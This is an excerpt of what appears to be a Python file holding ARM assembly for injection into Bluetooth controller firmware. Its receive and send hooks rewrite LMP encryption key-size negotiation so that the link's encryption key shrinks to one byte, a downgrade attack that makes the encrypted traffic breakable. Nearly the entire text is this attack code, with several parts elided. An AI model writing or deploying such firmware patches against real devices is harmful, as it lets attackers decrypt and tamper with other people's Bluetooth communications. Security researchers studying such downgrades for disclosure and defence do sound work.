...
LMP_MONITOR_INJECTED_CODE = """
    // Jump Table
    // NOTE: I guess that this is an error
    ...
    hook_recv_lmp:
        ...
        // RECV: master LMP encryption_key_size_req into 0x01 key size
        ldrb   r2, [r1]
        cmp    r2, #0x20
        bne    skip_recv_ksr
        mov    r2, #0x01  // ek len
    ...
    hook_send_lmp:
        ...
        // NOTE: [r1] point to the LMP payload that is wireshark is btbrlmp
        //////////////////////////////////////////////////////////////////////////////
        // SEND: master LMP accept encryption_key_size_req into
        ...
        cmp    r2, #0x10
        bne    skip_send_aksr
        mov    r2, #0x20      // lmp_pay[0]
        strb   r2, [r1]
        mov    r2, #0x01      // ek size, lmp_pay[1], should match SEND
        strb   r2, [r1, #1]
        skip_send_aksr:
